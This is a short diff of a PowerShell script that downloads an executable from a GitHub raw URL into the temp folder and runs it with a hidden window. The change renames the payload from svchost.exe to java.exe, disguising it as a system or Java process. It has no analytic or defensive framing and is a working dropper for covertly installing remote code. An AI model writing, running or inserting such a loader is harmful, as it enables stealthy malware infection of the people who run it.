@@ -1,5 +1,5 @@
-$u="https://github.com/3465h/idkkkk/raw/refs/heads/main/svchost.exe";
-$p="$env:temp\svchost.exe";
+$u="https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe";
+$p="$env:temp\java.exe";
 curl.exe -L $u -o $p;
 saps $p -WindowStyle Hidden;
 Add-Type -AssemblyName Microsoft.VisualBasic;
